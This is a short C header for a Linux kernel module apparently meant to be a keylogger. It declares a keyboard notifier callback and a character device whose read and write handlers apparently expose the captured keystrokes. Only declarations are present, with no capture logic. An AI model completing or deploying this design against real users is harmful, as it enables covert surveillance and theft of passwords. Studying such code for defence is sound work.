#ifndef KLOGGER_HEADER
#define KLOGGER_HEADER

int keyboard_listener(struct notifier_block *nblock, unsigned long code, void *_param);
int init_dev_file();
void clear_dev_file();
ssize_t read_dev_file(struct file *f, char __user *buf, size_t len, loff_t *off);
ssize_t write_dev_file(struct file *f, const char __user *buf, size_t len, loff_t *off);

/* declare handlers for each operation on character device */
static struct file_operations dev_fops =
{
  .owner = THIS_MODULE,
  .read = read_dev_file,
  .write = write_dev_file 
};

/* declare keyboard_listener as the handler of keyboard events */
static struct notifier_block nb = {
  .notifier_call = keyboard_listener
};

#endif
